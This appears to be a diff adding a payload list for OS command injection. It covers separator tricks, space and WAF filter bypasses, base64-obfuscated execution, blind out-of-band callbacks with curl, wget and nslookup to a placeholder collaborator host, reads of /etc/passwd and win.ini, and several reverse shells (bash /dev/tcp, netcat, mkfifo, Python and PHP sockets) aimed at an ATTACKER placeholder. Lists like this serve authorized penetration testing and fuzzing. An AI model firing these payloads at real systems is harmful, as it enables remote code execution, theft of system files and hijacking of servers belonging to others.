@@ -1,0 +1,107 @@
+# OS command injection — classic separators, WAF bypass, blind OOB
+
+# --- Simple separators ---
+;id
+|id
+||id
+&&id
+`id`
+$(id)
+${id}
+%0aid
+%0did
+%0d%0aid
+\nid
+\rid
+
+# --- With space bypass (when space is filtered) ---
+;id${IFS}-a
+;id$IFS$9
+;id%09
+;id%20
+;id${IFS%??}
+{id,-a}
+|{id,-a}
+
+# --- Prefix with legitimate arg ---
+x;id
+x|id
+x||id
+x&&id
+x`id`
+x$(id)
+
+# --- Blind (when output is hidden) ---
+;ping -c 5 127.0.0.1
+;sleep 5
+;curl http://YOURCOLLAB.interact.sh
+`curl YOURCOLLAB.interact.sh`
+$(curl YOURCOLLAB.interact.sh)
+;nslookup YOURCOLLAB.interact.sh
+;wget http://YOURCOLLAB.interact.sh -O /tmp/x
+;dig YOURCOLLAB.interact.sh
+
+# --- Windows ---
+&whoami
+&&whoami
+|whoami
+||whoami
+^whoami
+%26whoami
+;powershell -c whoami
+;cmd /c whoami
+;ping -n 5 127.0.0.1
+
+# --- Quote-escape from shell string ---
+";id;"
+";id;#
+';id;'
+$(id)
+`id`
+x";id;echo "
+x';id;echo '
+
+# --- WAF bypass via base64 ---
+;echo aWQ= | base64 -d | sh
+;bash -c {echo,aWQ=}|{base64,-d}|bash
+;`echo${IFS}aWQ=|base64${IFS}-d|sh`
+
+# --- Tab/newline separators ---
+%09id
+%0aid
+%0did
+%0cid
+%0bid
+
+# --- Quoting tricks ---
+;i'd';
+;i"d";
+;i\d;
+;i$()d;
+;\id;
+
+# --- File read (alternative to LFI) ---
+;cat /etc/passwd
+;cat${IFS}/etc/passwd
+;type c:\windows\win.ini
+;more /etc/passwd
+;less /etc/passwd
+;head /etc/passwd
+;tail /etc/passwd
+;sort /etc/passwd
+;od -c /etc/passwd
+
+# --- Reverse shell ---
+;bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+;nc -e /bin/sh ATTACKER 4444
+;nc ATTACKER 4444 -e /bin/sh
+;mkfifo /tmp/p; cat /tmp/p|/bin/sh 2>&1|nc ATTACKER 4444 >/tmp/p
+;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+;php -r '$s=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# --- PHP exec wrappers ---
+";system('id');//
+"; passthru('id');//
+"; shell_exec('id');//
+"; exec('id');//
+"; popen('id','r');//
